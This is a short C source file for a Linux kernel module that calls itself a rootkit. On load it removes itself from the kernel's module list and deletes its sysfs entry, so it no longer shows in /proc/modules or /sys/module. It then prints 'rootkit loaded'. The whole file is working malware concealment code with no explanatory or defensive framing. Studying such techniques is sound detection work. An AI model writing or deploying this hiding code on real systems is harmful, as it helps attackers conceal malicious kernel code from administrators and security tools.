#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/kobject.h>
MODULE_LICENSE("Dual BSD/GPL");

static int _init(void) {
    list_del_init(&__this_module.list);      /* /proc/modules */
    kobject_del(&THIS_MODULE->mkobj.kobj);   /* /sys/modules  */
    printk("rootkit loaded\n");
    return 0;
}

static void _exit(void) {
    printk("rootkit removed\n");
}

module_init(_init);
module_exit(_exit);
